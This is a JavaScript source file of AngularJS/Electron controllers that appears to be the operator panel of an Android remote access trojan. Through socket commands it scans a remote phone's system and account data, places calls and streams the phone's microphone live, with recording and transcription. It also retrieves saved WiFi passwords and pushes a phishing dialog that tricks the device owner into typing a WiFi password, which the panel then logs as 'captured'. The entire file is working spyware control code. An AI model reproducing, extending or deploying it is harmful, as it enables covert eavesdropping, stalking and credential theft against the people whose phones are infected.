//-----------------------System Info Controller------------------------
app.controller("SystemInfoCtrl", function ($scope, $rootScope) {
    $SysInfoCtrl = $scope;
    $SysInfoCtrl.systemData = null;
    $SysInfoCtrl.isLoading = false;
    $SysInfoCtrl.activeTab = 'battery';
    
    var systemInfo = CONSTANTS.orders.systemInfo || 'x0000si';

    $SysInfoCtrl.$on('$destroy', () => {
        socket.removeAllListeners(systemInfo);
    });

    $SysInfoCtrl.getAllSystemInfo = () => {
        $SysInfoCtrl.isLoading = true;
        $rootScope.Log('[→] Scanning system...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: systemInfo });
    };

    $SysInfoCtrl.formatUptime = (millis) => {
        if (!millis) return '0s';
        const seconds = Math.floor(millis / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        const days = Math.floor(hours / 24);
        
        if (days > 0) return `${days}d ${hours % 24}h`;
        if (hours > 0) return `${hours}h ${minutes % 60}m`;
        return `${minutes}m ${seconds % 60}s`;
    };

    $SysInfoCtrl.formatBytes = (bytes) => {
        if (!bytes || bytes === 0) return '0 B';
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
    };

    $SysInfoCtrl.formatTime = (millis) => {
        if (!millis) return '0s';
        const seconds = Math.floor(millis / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        
        if (hours > 0) return `${hours}h ${minutes % 60}m`;
        return `${minutes}m ${seconds % 60}s`;
    };

    $SysInfoCtrl.getBatteryClass = (level) => {
        if (level <= 15) return 'battery-low';
        if (level <= 40) return 'battery-medium';
        return 'battery-high';
    };

    $SysInfoCtrl.getAccountIcon = (type) => {
        if (type.includes('google')) return 'google icon';
        if (type.includes('facebook')) return 'facebook icon';
        if (type.includes('twitter')) return 'twitter icon';
        if (type.includes('whatsapp')) return 'whatsapp icon';
        if (type.includes('telegram')) return 'telegram icon';
        return 'user circle icon';
    };

    $SysInfoCtrl.getImportanceClass = (importance) => {
        if (importance === 'Foreground') return 'badge--success';
        if (importance === 'Visible') return 'badge--info';
        return 'badge--default';
    };

    socket.on(systemInfo, (data) => {
        $SysInfoCtrl.isLoading = false;
        $SysInfoCtrl.systemData = data;
        $rootScope.Log('[✓] System analysis complete', CONSTANTS.logStatus.SUCCESS);
        $SysInfoCtrl.$apply();
    });

    // Initial load
    $SysInfoCtrl.getAllSystemInfo();
});

//-----------------------Make Call Controller------------------------
app.controller("MakeCallCtrl", function ($scope, $rootScope) {
    $MakeCallCtrl = $scope;
    $MakeCallCtrl.phoneNumber = '';
    $MakeCallCtrl.callHistory = [];
    
    var makeCall = CONSTANTS.orders.makeCall || 'x0000mc2';

    $MakeCallCtrl.$on('$destroy', () => {
        socket.removeAllListeners(makeCall);
    });

    $MakeCallCtrl.makeCall = () => {
        if (!$MakeCallCtrl.phoneNumber) {
            $rootScope.Log('[✗] Please enter a phone number', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        $rootScope.Log(`[→] Initiating call to ${$MakeCallCtrl.phoneNumber}...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: makeCall, phoneNumber: $MakeCallCtrl.phoneNumber });
        
        // Add to history
        $MakeCallCtrl.callHistory.unshift({
            number: $MakeCallCtrl.phoneNumber,
            time: new Date().toLocaleTimeString()
        });
        
        if ($MakeCallCtrl.callHistory.length > 10) {
            $MakeCallCtrl.callHistory.pop();
        }
    };

    socket.on(makeCall, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] Call initiated to ${data.phoneNumber}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log(`[✗] Failed to make call: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $MakeCallCtrl.$apply();
    });
});

//-----------------------Live Mic Controller------------------------
app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
    $LiveMicCtrl = $scope;
    $LiveMicCtrl.isStreaming = false;
    $LiveMicCtrl.streamDuration = '00:00:00';
    $LiveMicCtrl.audioChunks = 0;
    $LiveMicCtrl.volume = 100;
    $LiveMicCtrl.isMuted = false;
    
    var liveMic = CONSTANTS.orders.liveMic || 'x0000lm2';
    var streamTimer = null;
    var startTime = null;
    var audioContext = null;
    var gainNode = null;
    var audioQueue = [];
    var isPlaying = false;
    
    // Recording vars
    var mediaRecorder = null;
    var recordedChunks = [];
    var destNode = null;
    var recordingStartTime = null;
    
    // Recorded streams list
    $LiveMicCtrl.recordedStreams = [];
    
    // Transcription vars
    $LiveMicCtrl.transcriptionEnabled = false;
    $LiveMicCtrl.transcriptionText = '';
    $LiveMicCtrl.transcriptionHistory = [];
    $LiveMicCtrl.transcriptionError = null;
    $LiveMicCtrl.transcriptionAvailable = false;
    var recognition = null; // Keep for Web Speech API fallback
    var currentTranscriptionText = '';
    var ipcRenderer = null;
    
    // Initialize IPC for transcription
    try {
        const { ipcRenderer: ipc } = require('electron');
        ipcRenderer = ipc;
        
        // Listen for transcription results
        if (ipcRenderer) {
            ipcRenderer.on('transcription:result', (event, result) => {
                if (result && result.text) {
                    if (result.final) {
                        // Final result - add to accumulated text
                        currentTranscriptionText += result.text + ' ';
                        $LiveMicCtrl.transcriptionText = currentTranscriptionText;
                        
                        // Add to history
                        $LiveMicCtrl.transcriptionHistory.unshift({
                            text: result.text.trim(),
                            timestamp: new Date().toLocaleTimeString()
                        });
                        
                        // Keep only last 20 history entries
                        if ($LiveMicCtrl.transcriptionHistory.length > 20) {
                            $LiveMicCtrl.transcriptionHistory.pop();
                        }
                    } else {
                        // Partial result - show live
                        $LiveMicCtrl.transcriptionText = currentTranscriptionText + result.text;
                    }
                    
                    if (!$LiveMicCtrl.$$phase) {
                        $LiveMicCtrl.$apply();
                    }
                }
            });
            
            // Check transcription availability
            ipcRenderer.send('transcription:status');
            ipcRenderer.once('transcription:status', (event, status) => {
                $LiveMicCtrl.transcriptionAvailable = status.initialized;
                if (!status.initialized) {
                    $LiveMicCtrl.transcriptionError = 'Transcription model not found. Please download a Vosk model.';
                }
                if (!$LiveMicCtrl.$$phase) {
                    $LiveMicCtrl.$apply();
                }
            });
        }
    } catch (e) {
        console.error('Failed to initialize IPC for transcription:', e);
    }

    // Initialize Web Audio API
    function initAudio() {
        try {
            audioContext = new (window.AudioContext || window.webkitAudioContext)({
                sampleRate: 44100
            });
            gainNode = audioContext.createGain();
            gainNode.connect(audioContext.destination);
            gainNode.gain.value = $LiveMicCtrl.volume / 100;
            
            // Setup recording destination
            destNode = audioContext.createMediaStreamDestination();
            gainNode.connect(destNode);
            
            $rootScope.Log('[✓] Audio context initialized', CONSTANTS.logStatus.SUCCESS);
        } catch (e) {
            $rootScope.Log(`[✗] Failed to init audio: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    }

    $LiveMicCtrl.startRecording = () => {
        if (!destNode) {
            $rootScope.Log('[✗] Audio context not initialized', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        try {
            recordedChunks = [];
            recordingStartTime = Date.now();
            currentTranscriptionText = ''; // Reset transcription for new recording
            mediaRecorder = new MediaRecorder(destNode.stream);
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    recordedChunks.push(e.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                saveRecording();
            };
            
            mediaRecorder.start();
            $LiveMicCtrl.isRecording = true;
            $rootScope.Log('[●] Recording started', CONSTANTS.logStatus.INFO);
            if (!$LiveMicCtrl.$$phase) {
                $LiveMicCtrl.$apply();
            }
        } catch (e) {
            $rootScope.Log(`[✗] Failed to start recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };

    $LiveMicCtrl.stopRecording = () => {
        if (mediaRecorder && $LiveMicCtrl.isRecording) {
            mediaRecorder.stop();
            $LiveMicCtrl.isRecording = false;
            $rootScope.Log('[■] Recording stopped, saving...', CONSTANTS.logStatus.INFO);
        }
    };

    function saveRecording() {
        if (recordedChunks.length === 0) return;
        
        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onload = () => {
            const buffer = Buffer.from(reader.result);
            const timestamp = Date.now();
            const filename = `LiveMic_${timestamp}.webm`;
            const savePath = path.join(downloadsPath, filename);
            
            // Calculate duration
            const duration = recordingStartTime ? Math.floor((Date.now() - recordingStartTime) / 1000) : 0;
            const durationStr = formatDuration(duration);
            const fileSize = buffer.length;
            const fileSizeStr = formatFileSize(fileSize);
            
            // Get transcription text if available
            const transcriptionText = currentTranscriptionText || ($LiveMicCtrl.transcriptionText || '');
            
            fs.outputFile(savePath, buffer, (err) => {
                if (err) {
                    $rootScope.Log(`[✗] Failed to save recording: ${err.message}`, CONSTANTS.logStatus.FAIL);
                } else {
                    $rootScope.Log(`[✓] Recording saved: ${savePath}`, CONSTANTS.logStatus.SUCCESS);
                    
                    // Add to recorded streams list
                    const recording = {
                        id: timestamp,
                        filename: filename,
                        path: savePath,
                        duration: durationStr,
                        durationSeconds: duration,
                        size: fileSizeStr,
                        sizeBytes: fileSize,
                        timestamp: timestamp,
                        date: new Date(timestamp).toLocaleString(),
                        transcription: transcriptionText || null
                    };
                    
                    $LiveMicCtrl.recordedStreams.unshift(recording);
                    
                    // Keep only last 50 recordings
                    if ($LiveMicCtrl.recordedStreams.length > 50) {
                        $LiveMicCtrl.recordedStreams.pop();
                    }
                    
                    // Clear current transcription text after saving
                    if (transcriptionText) {
                        currentTranscriptionText = '';
                    }
                    
                    if (!$LiveMicCtrl.$$phase) {
                        $LiveMicCtrl.$apply();
                    }
                }
            });
        };
        reader.readAsArrayBuffer(blob);
    }
    
    function formatDuration(seconds) {
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        
        if (hours > 0) {
            return `${hours}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        }
        return `${minutes}:${String(secs).padStart(2, '0')}`;
    }
    
    function formatFileSize(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
    }
    
    // Play recorded stream
    $LiveMicCtrl.playRecording = (recording) => {
        if (!recording || !recording.path) return;
        
        try {
            // Use HTML5 audio element to play the file
            const audio = document.createElement('audio');
            audio.src = 'file://' + recording.path.replace(/\\/g, '/');
            audio.controls = true;
            audio.style.width = '100%';
            
            // Create a temporary container and show it
            const container = document.createElement('div');
            container.style.position = 'fixed';
            container.style.top = '50%';
            container.style.left = '50%';
            container.style.transform = 'translate(-50%, -50%)';
            container.style.background = 'var(--bg-primary)';
            container.style.padding = '20px';
            container.style.borderRadius = '8px';
            container.style.boxShadow = '0 4px 20px rgba(0,0,0,0.3)';
            container.style.zIndex = '10000';
            container.style.minWidth = '400px';
            
            const closeBtn = document.createElement('button');
            closeBtn.innerHTML = '×';
            closeBtn.style.float = 'right';
            closeBtn.style.background = 'none';
            closeBtn.style.border = 'none';
            closeBtn.style.fontSize = '24px';
            closeBtn.style.cursor = 'pointer';
            closeBtn.style.color = 'var(--text-primary)';
            closeBtn.onclick = () => container.remove();
            
            container.appendChild(closeBtn);
            container.appendChild(document.createElement('br'));
            container.appendChild(document.createElement('br'));
            container.appendChild(audio);
            document.body.appendChild(container);
            
            audio.play().catch(e => {
                $rootScope.Log(`[✗] Failed to play recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
                container.remove();
            });
            
            $rootScope.Log(`[→] Playing recording: ${recording.filename}`, CONSTANTS.logStatus.INFO);
        } catch (e) {
            $rootScope.Log(`[✗] Error playing recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    // Open recording in file explorer
    $LiveMicCtrl.openRecording = (recording) => {
        if (!recording || !recording.path) return;
        
        try {
            const { remote } = require('electron');
            const shell = remote ? remote.shell : require('electron').shell;
            
            if (shell && shell.showItemInFolder) {
                shell.showItemInFolder(recording.path);
                $rootScope.Log(`[→] Opening recording location`, CONSTANTS.logStatus.INFO);
            } else if (shell && shell.openPath) {
                // Fallback: open the folder
                const dir = path.dirname(recording.path);
                shell.openPath(dir);
                $rootScope.Log(`[→] Opening recording folder`, CONSTANTS.logStatus.INFO);
            }
        } catch (e) {
            $rootScope.Log(`[✗] Failed to open recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    // Delete recorded stream
    $LiveMicCtrl.deleteRecording = (recording) => {
        if (!recording || !recording.path) return;
        
        try {
            fs.unlink(recording.path, (err) => {
                if (err) {
                    $rootScope.Log(`[✗] Failed to delete recording: ${err.message}`, CONSTANTS.logStatus.FAIL);
                } else {
                    // Remove from list
                    const index = $LiveMicCtrl.recordedStreams.findIndex(r => r.id === recording.id);
                    if (index !== -1) {
                        $LiveMicCtrl.recordedStreams.splice(index, 1);
                    }
                    $rootScope.Log(`[✓] Recording deleted: ${recording.filename}`, CONSTANTS.logStatus.SUCCESS);
                    if (!$LiveMicCtrl.$$phase) {
                        $LiveMicCtrl.$apply();
                    }
                }
            });
        } catch (e) {
            $rootScope.Log(`[✗] Error deleting recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };

    // Play audio buffer
    function playAudioChunk(audioData) {
        if (!audioContext || audioContext.state === 'closed') return;
        
        try {
            // Resume audio context if suspended (browser autoplay policy)
            if (audioContext.state === 'suspended') {
                audioContext.resume();
            }
            
            // Convert base64 or binary data to ArrayBuffer
            var arrayBuffer;
            if (typeof audioData === 'string') {
                // Base64 encoded
                var binary = atob(audioData);
                arrayBuffer = new ArrayBuffer(binary.length);
                var bytes = new Uint8Array(arrayBuffer);
                for (var i = 0; i < binary.length; i++) {
                    bytes[i] = binary.charCodeAt(i);
                }
            } else if (audioData.buffer) {
                // Binary data from socket
                arrayBuffer = new Uint8Array(audioData.buffer).buffer;
            } else {
                arrayBuffer = audioData;
            }
            
            // Send to transcription service if enabled
            if ($LiveMicCtrl.transcriptionEnabled && ipcRenderer && typeof audioData === 'string') {
                try {
                    ipcRenderer.send('transcription:process-audio', audioData);
                } catch (e) {
                    console.error('Failed to send audio to transcription:', e);
                }
            }
            
            // Android sends raw PCM16 data, not encoded audio
            // Skip decodeAudioData and go directly to PCM playback
            // decodeAudioData will fail on raw PCM, so use playRawPCM directly
            playRawPCM(arrayBuffer);
        } catch (e) {
            console.error('Audio playback error:', e);
        }
    }
    
    // Play raw PCM data (fallback) - Android sends 16000 Hz mono PCM16
    function playRawPCM(arrayBuffer) {
        try {
            var samples = new Int16Array(arrayBuffer);
            var floatSamples = new Float32Array(samples.length);
            
            // Check if data is all zeros (silence/no permission)
            var hasAudio = false;
            for (var i = 0; i < samples.length; i++) {
                floatSamples[i] = samples[i] / 32768.0;
                if (samples[i] !== 0) hasAudio = true;
            }
            
            if (!hasAudio && samples.length > 0) {
                console.warn('Received silent audio - microphone may not have permission');
            }
            
            // Use 16000 Hz to match Android recording sample rate
            var buffer = audioContext.createBuffer(1, floatSamples.length, 16000);
            buffer.getChannelData(0).set(floatSamples);
            
            var source = audioContext.createBufferSource();
            source.buffer = buffer;
            source.connect(gainNode);
            source.start(0);
        } catch (e) {
            console.error('Raw PCM playback error:', e);
        }
    }

    $LiveMicCtrl.$on('$destroy', () => {
        socket.removeAllListeners(liveMic);
        if (streamTimer) $interval.cancel(streamTimer);
        if (audioContext && audioContext.state !== 'closed') {
            audioContext.close();
        }
    });

    $LiveMicCtrl.startStream = () => {
        if (!audioContext) {
            initAudio();
        }
        
        $LiveMicCtrl.isStreaming = true;
        $LiveMicCtrl.audioChunks = 0;
        startTime = Date.now();
        
        $rootScope.Log('[→] Starting live microphone stream...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: liveMic, action: 'start' });
        
        // Start transcription if enabled
        if ($LiveMicCtrl.transcriptionEnabled) {
            if (!recognition) {
                initTranscription();
            }
            if (recognition) {
                try {
                    recognition.start();
                } catch (e) {
                    // Already started or error
                }
            }
        }
        
        // Update duration timer
        streamTimer = $interval(() => {
            var elapsed = Math.floor((Date.now() - startTime) / 1000);
            var hours = Math.floor(elapsed / 3600);
            var minutes = Math.floor((elapsed % 3600) / 60);
            var seconds = elapsed % 60;
            $LiveMicCtrl.streamDuration = 
                String(hours).padStart(2, '0') + ':' +
                String(minutes).padStart(2, '0') + ':' +
                String(seconds).padStart(2, '0');
        }, 1000);
    };
    
    $LiveMicCtrl.stopStream = () => {
        $LiveMicCtrl.isStreaming = false;
        
        // Stop recording if active
        if ($LiveMicCtrl.isRecording && mediaRecorder) {
            try {
                mediaRecorder.stop();
                $LiveMicCtrl.isRecording = false;
            } catch (e) {
                // Ignore
            }
        }
        
        $rootScope.Log('[→] Stopping microphone stream...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: liveMic, action: 'stop' });
        
        // Get final transcription result
        if ($LiveMicCtrl.transcriptionEnabled && ipcRenderer) {
            ipcRenderer.send('transcription:final');
        }
        
        // Stop Web Speech API transcription if active
        if (recognition) {
            try {
                recognition.stop();
            } catch (e) {
                // Already stopped
            }
        }
        
        // Disable transcription when stream stops
        $LiveMicCtrl.transcriptionEnabled = false;
        
        if (streamTimer) {
            $interval.cancel(streamTimer);
            streamTimer = null;
        }
        
        if (!$LiveMicCtrl.$$phase) {
            $LiveMicCtrl.$apply();
        }
    };
    
    $LiveMicCtrl.setVolume = (vol) => {
        $LiveMicCtrl.volume = vol;
        if (gainNode) {
            gainNode.gain.value = $LiveMicCtrl.isMuted ? 0 : vol / 100;
        }
    };
    
    $LiveMicCtrl.toggleMute = () => {
        $LiveMicCtrl.isMuted = !$LiveMicCtrl.isMuted;
        if (gainNode) {
            gainNode.gain.value = $LiveMicCtrl.isMuted ? 0 : $LiveMicCtrl.volume / 100;
        }
    };

    // Auto-retry on permission grant
    $rootScope.$on('PermissionGranted', (event, permission) => {
        if ((permission.toLowerCase().includes('mic') || permission.toLowerCase().includes('record')) && !$LiveMicCtrl.isStreaming) {
             $rootScope.Log('[→] Permission granted! Starting mic stream...', CONSTANTS.logStatus.INFO);
             $LiveMicCtrl.startStream();
        }
    });

    // Store recorded chunks for saving
    $LiveMicCtrl.recordedStreams = [];
    
    $LiveMicCtrl.saveCurrentRecording = () => {
        if (recordedChunks.length === 0) {
            $rootScope.Log('[✗] No recording to save', CONSTANTS.logStatus.FAIL);
            return;
        }
        saveRecording();
    };
    
    $LiveMicCtrl.discardCurrentRecording = () => {
        recordedChunks = [];
        currentTranscriptionText = '';
        $LiveMicCtrl.isRecording = false;
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
            try {
                mediaRecorder.stop();
            } catch (e) {
                // Ignore
            }
        }
        $rootScope.Log('[→] Recording discarded', CONSTANTS.logStatus.INFO);
        if (!$LiveMicCtrl.$$phase) {
            $LiveMicCtrl.$apply();
        }
    };
    
    // Transcription functions
    function initTranscription() {
        if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
            $rootScope.Log('[✗] Speech recognition not supported in this browser', CONSTANTS.logStatus.FAIL);
            $LiveMicCtrl.transcriptionEnabled = false;
            $LiveMicCtrl.transcriptionError = 'Speech recognition not supported';
            if (!$LiveMicCtrl.$$phase) {
                $LiveMicCtrl.$apply();
            }
            return;
        }
        
        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
        recognition = new SpeechRecognition();
        
        recognition.continuous = true;
        recognition.interimResults = true;
        recognition.lang = 'en-US';
        recognition.maxAlternatives = 1;
        
        recognition.onresult = (event) => {
            let interimTranscript = '';
            let finalTranscript = '';
            
            for (let i = event.resultIndex; i < event.results.length; i++) {
                const transcript = event.results[i][0].transcript;
                if (event.results[i].isFinal) {
                    finalTranscript += transcript + ' ';
                } else {
                    interimTranscript += transcript;
                }
            }
            
            // Update live transcription text immediately
            if (finalTranscript) {
                currentTranscriptionText += finalTranscript;
                $LiveMicCtrl.transcriptionText = currentTranscriptionText;
                
                // Add to history
                $LiveMicCtrl.transcriptionHistory.unshift({
                    text: finalTranscript.trim(),
                    timestamp: new Date().toLocaleTimeString()
                });
                
                // Keep only last 20 history entries
                if ($LiveMicCtrl.transcriptionHistory.length > 20) {
                    $LiveMicCtrl.transcriptionHistory.pop();
                }
            } else if (interimTranscript) {
                // Show interim results live
                $LiveMicCtrl.transcriptionText = currentTranscriptionText + interimTranscript;
            }
            
            // Force update UI immediately
            if (!$LiveMicCtrl.$$phase) {
                $LiveMicCtrl.$apply();
            } else {
                // If already in digest, use $timeout to ensure update
                setTimeout(() => {
                    if (!$LiveMicCtrl.$$phase) {
                        $LiveMicCtrl.$apply();
                    }
                }, 0);
            }
        };
        
        recognition.onerror = (event) => {
            console.error('Speech recognition error:', event.error);
            
            // Handle different error types
            let errorMessage = '';
            let shouldRetry = false;
            
            switch (event.error) {
                case 'no-speech':
                    // Ignore no-speech errors (normal when no one is talking)
                    return;
                case 'network':
                    errorMessage = 'Network error: Transcription requires internet connection';
                    shouldRetry = true;
                    break;
                case 'not-allowed':
                    errorMessage = 'Microphone permission denied. Please allow microphone access.';
                    $LiveMicCtrl.transcriptionEnabled = false;
                    break;
                case 'aborted':
                    // User or system aborted, don't show error
                    return;
                case 'audio-capture':
                    errorMessage = 'No microphone found or microphone not accessible';
                    $LiveMicCtrl.transcriptionEnabled = false;
                    break;
                case 'service-not-allowed':
                    errorMessage = 'Speech recognition service not allowed';
                    $LiveMicCtrl.transcriptionEnabled = false;
                    break;
                default:
                    errorMessage = `Transcription error: ${event.error}`;
                    shouldRetry = true;
            }
            
            if (errorMessage) {
                $LiveMicCtrl.transcriptionError = errorMessage;
                $rootScope.Log(`[✗] ${errorMessage}`, CONSTANTS.logStatus.FAIL);
            }
            
            // Auto-retry on network errors after a delay
            if (shouldRetry && $LiveMicCtrl.transcriptionEnabled && $LiveMicCtrl.isStreaming) {
                setTimeout(() => {
                    if ($LiveMicCtrl.transcriptionEnabled && $LiveMicCtrl.isStreaming && recognition) {
                        try {
                            recognition.start();
                            $LiveMicCtrl.transcriptionError = null;
                        } catch (e) {
                            console.error('Failed to restart recognition:', e);
                        }
                    }
                }, 2000);
            }
            
            if (!$LiveMicCtrl.$$phase) {
                $LiveMicCtrl.$apply();
            }
        };
        
        recognition.onstart = () => {
            $LiveMicCtrl.transcriptionError = null;
            $rootScope.Log('[✓] Transcription started', CONSTANTS.logStatus.SUCCESS);
            if (!$LiveMicCtrl.$$phase) {
                $LiveMicCtrl.$apply();
            }
        };
        
        recognition.onend = () => {
            // Auto-restart if still enabled and streaming
            if ($LiveMicCtrl.transcriptionEnabled && $LiveMicCtrl.isStreaming) {
                setTimeout(() => {
                    if ($LiveMicCtrl.transcriptionEnabled && $LiveMicCtrl.isStreaming && recognition) {
                        try {
                            recognition.start();
                        } catch (e) {
                            // Already started or error - will be handled by onerror
                        }
                    }
                }, 100);
            }
        };
    }
    
    $LiveMicCtrl.toggleTranscription = () => {
        if (!$LiveMicCtrl.isStreaming) {
            $rootScope.Log('[✗] Start streaming first to enable transcription', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        if (!$LiveMicCtrl.transcriptionAvailable && !ipcRenderer) {
            $rootScope.Log('[✗] Local transcription not available. Using Web Speech API fallback.', CONSTANTS.logStatus.WARNING);
            // Fallback to Web Speech API
            if (!recognition) {
                initTranscription();
            }
            if (recognition) {
                try {
                    recognition.start();
                    $LiveMicCtrl.transcriptionEnabled = true;
                    $rootScope.Log('[✓] Transcription enabled (Web Speech API - requires internet)', CONSTANTS.logStatus.SUCCESS);
                } catch (e) {
                    $rootScope.Log(`[✗] Failed to start transcription: ${e.message}`, CONSTANTS.logStatus.FAIL);
                    $LiveMicCtrl.transcriptionEnabled = false;
                    $LiveMicCtrl.transcriptionError = `Failed to start: ${e.message}`;
                }
            }
            if (!$LiveMicCtrl.$$phase) {
                $LiveMicCtrl.$apply();
            }
            return;
        }
        
        $LiveMicCtrl.transcriptionEnabled = !$LiveMicCtrl.transcriptionEnabled;
        $LiveMicCtrl.transcriptionError = null;
        
        if ($LiveMicCtrl.transcriptionEnabled) {
            // Reset recognizer for new stream
            if (ipcRenderer) {
                ipcRenderer.send('transcription:reset');
            }
            currentTranscriptionText = '';
            $LiveMicCtrl.transcriptionText = '';
            $rootScope.Log('[✓] Local transcription enabled (offline)', CONSTANTS.logStatus.SUCCESS);
        } else {
            // Get final result
            if (ipcRenderer) {
                ipcRenderer.send('transcription:final');
            }
            $rootScope.Log('[→] Transcription disabled', CONSTANTS.logStatus.INFO);
        }
        
        if (!$LiveMicCtrl.$$phase) {
            $LiveMicCtrl.$apply();
        }
    };
    
    $LiveMicCtrl.clearTranscription = () => {
        currentTranscriptionText = '';
        $LiveMicCtrl.transcriptionText = '';
        $LiveMicCtrl.transcriptionHistory = [];
        $LiveMicCtrl.transcriptionError = null;
        if (!$LiveMicCtrl.$$phase) {
            $LiveMicCtrl.$apply();
        }
    };

    socket.on(liveMic, (data) => {
        if (data.audio === true && data.data) {
            // Audio data is in data.data (base64 string)
            $LiveMicCtrl.audioChunks++;
            // Play the received audio data - data.data is base64 encoded PCM
            playAudioChunk(data.data);
        } else if (data.started) {
            $rootScope.Log('[✓] Live microphone streaming started', CONSTANTS.logStatus.SUCCESS);
        } else if (data.stopped) {
            $rootScope.Log('[✓] Live microphone streaming stopped', CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $rootScope.Log(`[✗] Microphone error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        
        if (!$LiveMicCtrl.$$phase) {
            $LiveMicCtrl.$apply();
        }
    });
});

//-----------------------WiFi Passwords Controller------------------------
app.controller("WiFiPasswordsCtrl", function ($scope, $rootScope) {
    $WiFiPwdCtrl = $scope;
    $WiFiPwdCtrl.wifiNetworks = [];
    $WiFiPwdCtrl.isLoading = false;
    $WiFiPwdCtrl.error = null;
    $WiFiPwdCtrl.capturedPassword = null;
    
    var wifiPasswords = CONSTANTS.orders.wifiPasswords || 'x0000wp';

    $WiFiPwdCtrl.$on('$destroy', () => {
        socket.removeAllListeners(wifiPasswords);
    });

    // Show phishing dialog to capture WiFi password
    $WiFiPwdCtrl.promptWifiPassword = () => {
        $rootScope.Log('[→] Showing WiFi password prompt on device...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifiPasswords, extra: 'prompt' });
    };

    $WiFiPwdCtrl.getWifiPasswords = () => {
        $WiFiPwdCtrl.isLoading = true;
        $WiFiPwdCtrl.error = null;
        $WiFiPwdCtrl.wifiNetworks = [];
        
        $rootScope.Log('[→] Retrieving WiFi passwords...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifiPasswords });
    };

    $WiFiPwdCtrl.copyPassword = (password) => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(password).then(() => {
                $rootScope.Log('[✓] Password copied to clipboard', CONSTANTS.logStatus.SUCCESS);
            });
        }
    };
    
    $WiFiPwdCtrl.promptPasswordForNetwork = (ssid) => {
        $rootScope.Log(`[→] Prompting password for network: ${ssid}...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifiPasswords, extra: 'prompt', ssid: ssid });
    };

    socket.on(wifiPasswords, (data) => {
        $WiFiPwdCtrl.isLoading = false;
        
        // Check if this is a captured password from phishing dialog
        if (data.password && data.ssid) {
            $WiFiPwdCtrl.capturedPassword = {
                ssid: data.ssid,
                password: data.password
            };
            $rootScope.Log(`[✓] PASSWORD CAPTURED! SSID: ${data.ssid}, Password: ${data.password}`, CONSTANTS.logStatus.SUCCESS);
            
            // Also add to networks list
            $WiFiPwdCtrl.wifiNetworks.unshift({
                ssid: data.ssid,
                password: data.password,
                security: 'Captured',
                showPassword: true
            });
        } else if (data.message && data.instruction) {
            // Prompt shown confirmation
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $WiFiPwdCtrl.error = {
                title: 'Failed to retrieve passwords',
                message: data.error
            };
            $rootScope.Log(`[✗] WiFi passwords error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        } else if (data.networks) {
            $WiFiPwdCtrl.wifiNetworks = data.networks.map(n => ({ ...n, showPassword: false }));
            $rootScope.Log(`[✓] Found ${data.networks.length} saved WiFi networks`, CONSTANTS.logStatus.SUCCESS);
            
            if (data.note) {
                $rootScope.Log(`[!] ${data.note}`, CONSTANTS.logStatus.WARN);
            }
        }
        
        $WiFiPwdCtrl.$apply();
    });
});
